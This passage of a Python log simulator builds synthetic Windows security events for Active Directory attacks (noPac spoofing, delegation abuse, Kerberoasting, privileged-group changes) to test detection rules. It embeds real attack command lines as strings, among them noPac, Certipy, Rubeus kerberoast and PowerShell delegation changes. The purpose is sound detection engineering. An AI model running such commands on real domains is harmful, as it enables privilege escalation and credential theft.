        ("C:\\Users\\Public\\Certipy.exe",
         f"Certipy.exe account update -u {u['username']}@{dns_domain} "
         f"-p <password> -user {machine_name}$ -dns {dc_host}"),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    old_dns = f"{machine_name.lower()}.{dns_domain}"
    old_spn_host = f"HOST/{old_dns}"
    old_spn_rkrb = f"RestrictedKrbHost/{old_dns}"
    new_spn_host = f"HOST/{dc_host}"
    new_spn_rkrb = f"RestrictedKrbHost/{dc_host}"

    # 5136 pair: dNSHostName Value Deleted (old) then Value Added (new)
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=machine_dn,
        object_class="computer",
        object_guid=machine_guid,
        attribute_name="dNSHostName",
        attribute_value=old_dns,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14675",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=machine_dn,
        object_class="computer",
        object_guid=machine_guid,
        attribute_name="dNSHostName",
        attribute_value=dc_host,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001

    # 5136 pairs: servicePrincipalName delete old, add new (per SPN)
    for old_spn, new_spn in [(old_spn_host, new_spn_host),
                              (old_spn_rkrb, new_spn_rkrb)]:
        events.append(json.dumps(_build_5136(
            u, config,
            object_dn=machine_dn,
            object_class="computer",
            object_guid=machine_guid,
            attribute_name="servicePrincipalName",
            attribute_value=old_spn,
            attribute_syntax_oid="2.5.5.12",
            operation_type="%%14675",
            op_correlation_id=op_corr_id,
            logon_id=logon_id, ts=t)))
        t += 0.001
        events.append(json.dumps(_build_5136(
            u, config,
            object_dn=machine_dn,
            object_class="computer",
            object_guid=machine_guid,
            attribute_name="servicePrincipalName",
            attribute_value=new_spn,
            attribute_syntax_oid="2.5.5.12",
            operation_type="%%14674",
            op_correlation_id=op_corr_id,
            logon_id=logon_id, ts=t)))
        t += 0.001
    t += 0.01

    # 4742: computer account changed — final-state values
    all_new_spns = f"{new_spn_host}\r\n\t{new_spn_rkrb}\r\n\tHOST/{dc_short}"
    events.append(json.dumps(_build_4742(
        u, config,
        target_computer_name=machine_sam,
        target_sid=machine_sid,
        sam_account_name=machine_sam,
        dns_host_name=dc_host,
        spns=all_new_spns,
        logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)

    fake_machine_user = {**u, "username": machine_sam, "hostname": dc_host}
    events.append(json.dumps(_build_4769(fake_machine_user, config,
                                         service_spn=f"ldap/{dc_host}",
                                         encryption="0x12",
                                         ip_override=u.get("ip"),
                                         ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_samaccountname_spoofing(config, session_context):
    """TGT request with a spoofed sAMAccountName — CVE-2021-42278/42287 (noPac).

    The attacker creates a machine account, renames its sAMAccountName to match
    a domain controller (without the trailing $), requests a TGT under that
    spoofed name, renames back to avoid collision, then exchanges the TGT for
    a TGS — the KDC resolves the TGT's principal to the real DC account and
    issues a DC-level service ticket.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4741 machine account created (attacker-controlled)
      3. 4688 PowerShell / noPac tool process creation
      4. 5136 sAMAccountName changed to DC name (e.g., "DC01") — KEY TRIGGER
      5. 4768 TGT request under the spoofed sAMAccountName
      6. 5136 sAMAccountName changed back to original
      7. 4769 TGS request using the spoofed TGT → DC service ticket
      8. 4689 process exit

    Detection keys:
      - 5136 with AttributeLDAPDisplayName=sAMAccountName and value matching
        a domain controller name (without trailing $)
      - 5136 servicePrincipalName cleared (triggers "SPNs cleared from a machine account")
      - 4768 for a principal that matches a DC name
      - sAMAccountName rename events (5136) bracketing a 4768
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    dc_short = _get_dc_short(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    machine_suffix = random.randint(100, 9999)
    machine_name = random.choice(["YOURPC", "WKSTMP", "DESKTOP", "CLIENT"]) + str(machine_suffix)
    machine_sam = f"{machine_name}$"
    machine_dn = f"CN={machine_name},CN=Computers,{base_dn}"
    machine_guid = "{" + str(uuid.uuid4()) + "}"
    machine_sid = _stable_user_sid(machine_name)

    events = []
    t = time.time()

    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    original_spns = [
        f"HOST/{machine_name.lower()}.{dns_domain}",
        f"RestrictedKrbHost/{machine_name.lower()}.{dns_domain}",
    ]
    events.append(json.dumps(_build_4741(u, config,
                                         target_computer_name=machine_sam,
                                         target_sid=machine_sid,
                                         sam_account_name=machine_sam,
                                         dns_host_name=f"{machine_name.lower()}.{dns_domain}",
                                         spns=" ".join(original_spns),
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Set-ADComputer {machine_name} '
         f"-ServicePrincipalName @{{}} ; Set-ADComputer {machine_name} "
         f"-SamAccountName '{dc_short}'\""),
        ("C:\\Users\\Public\\noPac.exe",
         f"noPac.exe -domain {dns_domain} -user {u['username']} -pass <password> "
         f"-dc-ip {dc_host} -impersonate Administrator"),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    for spn in original_spns:
        events.append(json.dumps(_build_5136(
            u, config,
            object_dn=machine_dn,
            object_class="computer",
            object_guid=machine_guid,
            attribute_name="servicePrincipalName",
            attribute_value=spn,
            attribute_syntax_oid="2.5.5.12",
            operation_type="%%14675",
            op_correlation_id=op_corr_id,
            logon_id=logon_id, ts=t)))
        t += 0.001

    t += random.uniform(0.3, 0.8)

    events.append(json.dumps(_build_4742(
        u, config,
        target_computer_name=machine_sam,
        target_sid=machine_sid,
        sam_account_name=machine_sam,
        dns_host_name=f"{machine_name.lower()}.{dns_domain}",
        spns="-",
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.5)

    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=machine_dn,
        object_class="computer",
        object_guid=machine_guid,
        attribute_name="sAMAccountName",
        attribute_value=machine_sam,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14675",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=machine_dn,
        object_class="computer",
        object_guid=machine_guid,
        attribute_name="sAMAccountName",
        attribute_value=dc_short,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.05

    # 4742 carrying the SPOOFED name — this is the event the detector can actually read.
    # The rename to a DC name was previously expressed only in the 5136 pair above, and
    # 5136 is NOT in XSIAM's analytics intake, so "this machine account name was modified
    # to <DC name>" was invisible: the single 4742 emitted earlier still reported the
    # ORIGINAL name, so "TGT request with a spoofed sAMAccountName - Event log"
    # (rule aa13b505) never saw the rename on a consumed event.
    events.append(json.dumps(_build_4742(
        u, config,
        target_computer_name=machine_sam,
        target_sid=machine_sid,
        sam_account_name=dc_short,
        dns_host_name=f"{machine_name.lower()}.{dns_domain}",
        spns="-",
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 0.8)

    # The 4768 must name the spoofed account WITH its trailing "$".
    #
    # This is not theory — it is what the events that actually fired "TGT request with a
    # spoofed sAMAccountName - Event log" (rule aa13b505) contained. The last such event
    # still in retention, 2026-07-02 08:39, carries TargetUserName="DC01$". The rule then
    # stopped firing entirely, and the current generator emits "DC01" with no "$".
    #
    # (Conceptually noPac renames the machine account to the DC name *without* the "$";
    # the KDC still logs the principal with it. Match the observed event, not the theory.)
    #
    # The 4769 below deliberately keeps the bare "DC01" form: that shape currently fires
    # "Service ticket request with a spoofed sAMAccountName" (rule 633ca673) reliably, and
    # is not to be disturbed while fixing its sibling.
    # IpAddress "::1" — the request appears to originate ON the DC, which is what the
    # alert text describes ("requested from host DC01.examplecorp.local"). This is the one
    # SYSTEMATIC difference between the events that fired rule aa13b505 on 2026-07-02 and
    # the ones that stopped firing: the July events carried ::1, the current generator
    # always emits the acting user's routable IP. (TicketEncryptionType also differed,
    # 0x11 vs 0x12, but that is random from _TICKET_ENC_NORMAL and therefore noise.)
    spoofed_tgt_user = {**u, "username": f"{dc_short}$", "hostname": dc_host, "ip": "::1"}
    spoofed_user = {**u, "username": dc_short, "hostname": dc_host}
    events.append(json.dumps(_build_4768(spoofed_tgt_user, config, ip_override="::1",
                                         ts=t)))
    t += random.uniform(0.2, 0.5)

    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=machine_dn,
        object_class="computer",
        object_guid=machine_guid,
        attribute_name="sAMAccountName",
        attribute_value=dc_short,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14675",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=machine_dn,
        object_class="computer",
        object_guid=machine_guid,
        attribute_name="sAMAccountName",
        attribute_value=machine_sam,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4769(spoofed_user, config,
                                         service_spn=f"cifs/{dc_host}",
                                         encryption="0x12",
                                         ip_override=u.get("ip"),
                                         ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# Delegation SPNs organized by severity for the three XSIAM variants:
#   - Generic service delegation (base severity)
#   - Delegation to a DC service (higher severity)
#   - Delegation to KRBTGT (highest severity — enables golden ticket forgery)
_DELEGATION_TARGETS_GENERIC = [
    "cifs/fs01.{dns_domain}",
    "HTTP/intranet.{dns_domain}",
    "MSSQLSvc/sql01.{dns_domain}:1433",
    "WSMAN/mgmt01.{dns_domain}",
    "HTTP/sharepoint.{dns_domain}",
]

_DELEGATION_TARGETS_DC = [
    "ldap/{dc_host}",
    "cifs/{dc_host}",
    "HOST/{dc_host}",
    "GC/{dc_host}/{dns_domain}",
]

_DELEGATION_TARGETS_KRBTGT = [
    "krbtgt/{dns_domain_upper}",
    "krbtgt",
]


def _threat_new_machine_delegation(config, session_context):
    """A NEWLY CREATED machine account is configured for Kerberos delegation.

    The two halves are independently proven on this tenant, and have simply never been
    combined: three generators create machine accounts via 4741, and _threat_delegation_change
    fires "User account delegation to KRBTGT" from a delegation change. That generator
    operates only on USER accounts (Set-ADUser), so this is genuinely new coverage rather
    than a variant of it.

    Which event carries the signal matters. delegation_change corroborates with 5136
    (msDS-AllowedToDelegateTo, userAccountControl) but the event XSIAM actually consumes is
    the 4738 that carries AllowedToDelegateTo. 5136 is not in XSIAM's Windows analytics
    intake, so a 5136-only sequence is invisible — that is exactly why dmsa_privesc sat
    silent until a 4662 was added. For a machine the 4738 equivalent is 4742, which has its
    own AllowedToDelegateTo field, so the delegation is expressed there.

    Attack: an attacker with machine-account-creation rights (the AD default
    ms-DS-MachineAccountQuota = 10 allows any authenticated user to create up to ten)
    creates a computer object and immediately grants it constrained delegation to a DC
    service. The new machine can then impersonate users to that service.

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 PowerShell New-ADComputer / Set-ADComputer
      3. 4741 computer account CREATED (the "new machine")
      4. 5136 msDS-AllowedToDelegateTo added   (corroboration)
      5. 5136 userAccountControl -> TRUSTED_TO_AUTH_FOR_DELEGATION (corroboration)
      6. 4742 computer account CHANGED, AllowedToDelegateTo = DC SPN  (KEY TRIGGER)
      7. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))

    # A brand-new machine account, named the way the default quota abuse tools do.
    machine_short = f"DESKTOP-{random.randint(1000, 9999)}"
    machine_sam = f"{machine_short}$"
    machine_dn = f"CN={machine_short},CN=Computers,{base_dn}"
    machine_sid = _stable_user_sid(machine_sam)
    machine_guid = "{" + str(uuid.uuid4()) + "}"

    target_spn = random.choice(_DELEGATION_TARGETS_DC).format(
        dc_host=dc_host, dns_domain=dns_domain)

    events = []
    t = time.time() - random.uniform(60.0, 180.0)
    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            f'powershell.exe -ep bypass -c "New-ADComputer -Name {machine_short} '
            f'-SAMAccountName {machine_sam} -ServicePrincipalNames \'HOST/{machine_short}\'; '
            f'Set-ADComputer {machine_short} -Add @{{\'msDS-AllowedToDelegateTo\'='
            f'\'{target_spn}\'}} -TrustedToAuthForDelegation $true"')
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    # 4741 — the machine is CREATED. This is what makes it a "new" machine.
    events.append(json.dumps(_build_4741(u, config,
                                         target_computer_name=machine_sam,
                                         target_sid=machine_sid,
                                         sam_account_name=machine_sam,
                                         dns_host_name=f"{machine_short.lower()}.{dns_domain}",
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 4.0)

    # 5136 corroboration — the delegation attribute and the UAC flag.
    events.append(json.dumps(_build_5136(
        u, config, object_dn=machine_dn, object_class="computer",
        object_guid=machine_guid,
        attribute_name="msDS-AllowedToDelegateTo",
        attribute_value=target_spn,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        u, config, object_dn=machine_dn, object_class="computer",
        object_guid=machine_guid,
        attribute_name="userAccountControl",
        attribute_value="0x1080000",   # WORKSTATION_TRUST | TRUSTED_TO_AUTH_FOR_DELEGATION
        attribute_syntax_oid="2.5.5.9",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.6)

    # 4742 — KEY TRIGGER. The machine-account equivalent of the 4738 that carries
    # delegation_change's signal; this is the consumed event.
    events.append(json.dumps(_build_4742(
        u, config,
        target_computer_name=machine_sam,
        target_sid=machine_sid,
        sam_account_name=machine_sam,
        dns_host_name=f"{machine_short.lower()}.{dns_domain}",
        spns=f"HOST/{machine_short}",
        old_uac_value="0x80000",
        new_uac_value="0x1080000",
        uac_control="%%2093",          # TRUSTED_TO_AUTH_FOR_DELEGATION - Enabled
        allowed_to_delegate=target_spn,
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_delegation_change(config, session_context):
    """User account delegation change — attacker modifies msDS-AllowedToDelegateTo
    to enable constrained delegation to a target service.

    Three severity variants (weighted randomly):
      - Generic service delegation: allows impersonation to file/web/SQL services
      - DC service delegation: allows impersonation to DC (ldap/cifs/HOST)
      - KRBTGT delegation: allows forging any ticket (golden ticket equivalent)

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 PowerShell / AD module process creation
      3. 5136 msDS-AllowedToDelegateTo delete/add pair (old="-", new=SPN)
      4. 5136 userAccountControl delete/add pair (old=512, new=16777728)
      5. 4738 user account changed (UAC + delegation)
      6. 4769 TGS request using the delegated service ticket
      7. 4689 process exit

    Detection keys:
      - 5136 with AttributeLDAPDisplayName=msDS-AllowedToDelegateTo
      - Higher severity when delegation target is a DC service or KRBTGT
      - userAccountControl change to include TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    dns_domain_upper = dns_domain.upper()
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    variant = random.choices(
        ["dc", "krbtgt"],
        weights=[55, 45], k=1)[0]

    if variant == "krbtgt":
        target_spn_template = random.choice(_DELEGATION_TARGETS_KRBTGT)
        target_spn = target_spn_template.format(
            dns_domain_upper=dns_domain_upper, dns_domain=dns_domain)
    else:
        target_spn_template = random.choice(_DELEGATION_TARGETS_DC)
        target_spn = target_spn_template.format(
            dc_host=dc_host, dns_domain=dns_domain)

    victim_acct = random.choice(_SERVICE_ACCOUNT_SAMS)
    victim_dn = f"CN={victim_acct},CN=Users,{base_dn}"
    victim_guid = "{" + str(uuid.uuid4()) + "}"

    events = []
    t = time.time()

    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Set-ADUser {victim_acct} '
         f"-Add @{{'msDS-AllowedToDelegateTo'='{target_spn}'}} "
         f'-TrustedToAuthForDelegation $true"'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Set-ADAccountControl -Identity {victim_acct} '
         f'-TrustedToAuthForDelegation $true; '
         f"Set-ADUser {victim_acct} -Add @{{'msDS-AllowedToDelegateTo'='{target_spn}'}}\""),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    # 5136: msDS-AllowedToDelegateTo — add only (no prior value to delete)
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=victim_dn,
        object_class="user",
        object_guid=victim_guid,
        attribute_name="msDS-AllowedToDelegateTo",
        attribute_value=target_spn,
        attribute_syntax_oid="2.5.5.12",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.02

    # 5136: userAccountControl delete/add pair (512 → 16777728)
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=victim_dn,
        object_class="user",
        object_guid=victim_guid,
        attribute_name="userAccountControl",
        attribute_value="512",
        attribute_syntax_oid="2.5.5.9",
        operation_type="%%14675",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.001
    events.append(json.dumps(_build_5136(
        u, config,
        object_dn=victim_dn,
        object_class="user",
        object_guid=victim_guid,
        attribute_name="userAccountControl",
        attribute_value="16777728",
        attribute_syntax_oid="2.5.5.9",
        operation_type="%%14674",
        op_correlation_id=op_corr_id,
        logon_id=logon_id, ts=t)))
    t += 0.05

    victim_sid = f"{_SYNTH_DOMAIN_SID}-{random.randint(1100, 9999)}"
    events.append(json.dumps(_build_4738(
        u, config,
        target_username=victim_acct,
        target_sid=victim_sid,
        sam_account_name=victim_acct,
        old_uac_value="0x200",
        new_uac_value="0x1000200",
        uac_control="%%2098",
        allowed_to_delegate=target_spn,
        logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)

    fake_svc_user = {**u, "username": victim_acct}
    events.append(json.dumps(_build_4769(fake_svc_user, config,
                                         service_spn=target_spn,
                                         encryption="0x12",
                                         ip_override=u.get("ip"),
                                         ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_multiple_service_tickets(config, session_context):
    """A user requested multiple service tickets — volume-based Kerberoasting.

    XSIAM detectors targeted (both Identity Analytics, both fed by the Windows
    Event Collector, both 10-minute test period, both deduplicated for 1 day
    per user — so a re-fire for the same user inside 24h is suppressed):
      - "A user requested multiple service tickets"
        variation "Abnormal issuance of service tickets to a user"
      - "A user received multiple weakly encrypted service tickets"
        variation "Abnormal issuance of weakly encrypted service tickets to a user"

    Both count 4769 events grouped by the requesting user.  Two things decide
    whether they fire:
      - breadth: the number of DISTINCT services associated with *user* accounts.
        Tickets issued to computer accounts (ServiceName ending in "$") are
        ordinary Kerberos traffic and are filtered out, so every target here is
        an SPN-bearing service account from _KERBEROAST_SPNS (1:1 SPN→account).
      - weak encryption: RC4-HMAC (0x17) on every ticket, which is what
        Kerberoasting tools request to get crackable hashes.

    Sequence:
      1. Attacker authenticates → 4768 TGT (normal AES, krbtgt)
      2. DC-side 4624 + endpoint 4624 + 4672
      3. 4688 Rubeus / PowerShell kerberoast tool
      4. Burst of 40-55 4769 TGS requests, RC4 (0x17), TicketOptions 0x40810000,
         each to a DISTINCT service account — KEY TRIGGER
      5. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    src_ip = u.get("ip") or "10.0.0.1"

    num_tickets = random.randint(40, min(55, len(_KERBEROAST_SPNS)))
    targets = random.sample(_KERBEROAST_SPNS, k=num_tickets)

    events = []
    t = time.time() - len(targets) * 2

    logon_id = _new_logon_id()
    logon_guid = _new_logon_guid()

    events.append(json.dumps(_build_4768(u, config, ip_override=src_ip, ts=t)))
    t += 1.0
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=src_ip,
                                             logon_id=logon_id, ts=t)))
    t += 1.2
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         logon_guid=logon_guid,
                                         ip_override=src_ip,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Users\\Public\\Rubeus.exe",
         "C:\\Users\\Public\\Rubeus.exe kerberoast /rc4opsec /format:hashcat /nowrap"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -ep bypass -c \"Get-ADUser -Filter {ServicePrincipalName -ne '$null'} "
         "-Properties ServicePrincipalName | ForEach { Add-Type -AssemblyName System.IdentityModel; "
         "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken "
         "-ArgumentList $_.ServicePrincipalName[0] }\""),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -ep bypass -c \"Import-Module .\\GetUserSPNs.ps1; "
         "Invoke-Kerberoast -OutputFormat Hashcat\""),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    for spn in targets:
        ev = _build_4769(u, config, service_spn=spn, encryption="0x17",
                         ip_override=src_ip, ts=t)
        ev["event_data"]["LogonGuid"] = logon_guid
        # One service account == one SID.  _build_4769 derives ServiceSid from
        # the SPN string, which hands the same account a different SID per SPN.
        ev["event_data"]["ServiceSid"] = _stable_user_sid(
            ev["event_data"]["ServiceName"])
        events.append(json.dumps(ev))
        t += random.uniform(0.3, 0.8)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(60, 300)
    session = _pop_open_session(u["hostname"], u["username"])
    if session:
        events.append(json.dumps(_build_4634(session, config, ts=t)))

    return events


def _threat_priv_group_add_remove(config, session_context):
    """User added to a privileged group and removed shortly after.

    Three XSIAM variants (all triggered by the same event pattern):
      - "User added to a privileged group and removed" (Low)
      - "Rare privileged group addition and removal" (Medium)
      - "User added to a group and removed the added user" (Low)

    The detection fires when a user is added to a privileged group (4728/4732/4756)
    and then removed (4729/4733/4757) within a short window — typically minutes.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 PowerShell / net.exe process creation
      3. 4728/4732/4756 member added to privileged group — KEY TRIGGER
      4. Short dwell time (30s-5min) — attacker uses elevated access
      5. 4729/4733/4757 member removed from privileged group — KEY TRIGGER
      6. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    _peers = _peer_windows_users(session_context, u["username"], need=1)
    victim = random.choice(_peers) if _peers else None
    if not victim:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    # Builtin\Administrators is deliberately excluded. It is a machine-local BUILTIN alias
    # (S-1-5-32-544, TargetDomainName="Builtin") with no domain SID prefix, and XSIAM's
    # Identity Analytics resolves the added-to group as a domain principal — the live alert
    # text reads "The group is on the domain EXAMPLECORP". Every LogSim add event using a
    # domain-prefixed group SID fired an alert (Domain Admins/512 via 4728, Enterprise
    # Admins/519 via 4756, SMS Admins/1200 via 4732); the only run that drew Administrators
    # produced 4732+4733 and total silence. The event ID is not the discriminator — the
    # group identity is.
    group_name = random.choice(["Domain Admins", "Enterprise Admins"])
    grp = _PRIVILEGED_GROUPS[group_name]
    add_eid = grp["event_id"]
    remove_eid = grp["remove_id"]

    is_machine = random.random() < 0.3
    if is_machine:
        member_name = f"CN={victim['hostname']},CN=Computers,{base_dn}"
        member_sid = _stable_user_sid(victim["hostname"])
    else:
        member_name = f"CN={victim['username']},CN=Users,{base_dn}"
        member_sid = _stable_user_sid(victim["username"])

    # The whole add -> dwell -> remove arc is BACKDATED so the removal lands at roughly
    # "now" rather than in the future. The previous form started at time.time() and then
    # padded to t0 + dwell + 60, shipping the removal with a time_created 16-46 minutes
    # ahead of wall clock — something no real WEC source does, and which no pair
    # correlation can act on. dwell is shortened so the removal falls inside a plausible
    # "shortly after" window and inside the harness's alert SLA.
    dwell = random.uniform(300.0, 600.0)
    events = []
    start_ts = time.time() - dwell - 90.0
    t = start_ts

    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    if group_name == "Administrators":
        cmd = f'net localgroup Administrators {victim["username"]} /add'
    else:
        cmd = (f'powershell.exe -ep bypass -c "Add-ADGroupMember '
               f"-Identity '{group_name}' -Members '{victim['username']}'\"")
    tool = ("C:\\Windows\\System32\\net.exe" if "net " in cmd
            else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
    events.append(json.dumps(_build_4688(u, config, process_name=tool,
                                         command_line=cmd,
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    add_builder = _ADD_BUILDERS[add_eid]
    events.append(json.dumps(add_builder(
        u, config,
        member_name=member_name,
        member_sid=member_sid,
        target_group=group_name,
        target_sid=grp["sid"],
        logon_id=logon_id, ts=t)))

    # ── Attacker dwell time: use the elevated access before removing tracks ──
    # (dwell is drawn above, before the backdated start_ts is computed from it)
    t += random.uniform(30.0, 120.0)

    # Attacker logs into other machines with the elevated account
    victim_u = {**victim, "ip": u.get("ip")}
    # session_context.values() are raw profile dicts (keyed on primary_os_type); only
    # get_user_by_name() -- via _get_windows_users() -- returns the resolved user_info
    # shape carrying hostname/username. The old comprehension therefore always produced
    # an empty pool and the whole lateral-movement block was dead code (the failing run
    # ingested exactly 4624 x2 / 4672 x1: zero lateral iterations).
    _lateral_pool = [p for p in _get_windows_users(session_context)
                     if p.get("hostname") and p["username"] != u["username"]]
    lateral_targets = random.sample(
        _lateral_pool,
        k=min(random.randint(1, 3), len(_lateral_pool))) if _lateral_pool else []
    for tgt in lateral_targets:
        tgt_host = tgt.get("hostname", "WKS-TEMP")
        events.append(json.dumps(_build_4624(victim_u, config, logon_type=3,
                                             auth_pkg=_KRB_PACKAGE,
                                             ip_override=u.get("ip"),
                                             ts=t)))
        t += random.uniform(5.0, 15.0)
